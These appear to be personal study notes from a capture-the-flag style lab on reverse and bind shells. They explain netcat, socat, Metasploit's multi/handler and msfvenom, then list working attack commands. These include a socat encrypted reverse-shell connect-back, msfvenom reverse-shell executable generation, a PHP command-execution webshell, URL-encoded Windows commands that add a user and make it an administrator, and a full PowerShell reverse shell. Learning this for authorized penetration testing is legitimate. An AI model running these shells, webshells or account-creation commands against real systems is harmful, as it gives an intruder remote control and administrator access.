## Netcat:

Netcat is the traditional "Swiss Army Knife" of networking. 
It is used to manually perform all kinds of network interactions, 
including things like banner grabbing during enumeration, but more importantly for our uses, 
it can be used to receive reverse shells and connect to remote ports attached 
to bind shells on a target system. Netcat shells are very unstable (easy to lose) 
by default, but can be improved by techniques that we will be covering in an upcoming task.

## Socat:

Socat is like netcat on steroids. It can do all of the same things, and many more. 
Socat shells are usually more stable than netcat shells out of the box. In this 
sense it is vastly superior to netcat; however, there are two big catches:
The syntax is more difficult
Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

## Metasploit -- multi/handler:

The auxiliary/multi/handler module of the Metasploit framework is, like socat and netcat, 
used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler 
provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. 
It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads -- 
both of which we will look at in task 9.

## Msfvenom:

Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is 
shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom 
can generate payloads other than reverse and bind shells, these are what we will be focusing on 
in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much 
more detail in a dedicated task.

## OTHER
Aside from the tools we've already covered, there are some repositories of shells in many 
different languages. One of the most prominent of these is Payloads all the Things. 
The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these 
online resources, Kali Linux also comes pre-installed with a variety of webshells located 
at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also 
contains some very useful code for obtaining shells.

## SOCAT
# setting up an OPENSSL-LISTENER using the tty technique, Use port 53, and a PEM file called "encrypt.pem"
socat OPENSSL-LISTENER:53, cert=encrypt.pem, verify=0, FILE:`tty`,raw,echo=0
# your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
socat OPENSSL:10.10.10.5:53, verify=0, EXEC:"bash -li", pty, stderr, sigint, setsid, sane

## NETCAT
nc -lvp [listening port]

## MSFVENOM
# generate an exe file for the target to execute
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

## Payload Naming convention
<OS>/<arch>/<payload>
linux/x86/shell_reverse_tcp
windows/shell_reverse_tcp (pour 32 bits arch)
windows/x64/meterpreter/reverse_tcp
linux/x86/meterpreter_reverse_tcp
# with _ means its a stageless payload
# list all ms payloads
msfvenom --list payloads

## Webshell (use with php url queries, in upload file part) for both linux and windows server
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

## RDP
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.72.72 /u:Administrator /p:'TryH4ckM3!'

### Windows shell ownage
# create user from webshells & escalation priv
net%20user%20<username>%20<password>%20/add
net%20localgroup%20administrators%20test%20/add

## script to Drop a reverse powershell on a windows machine
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"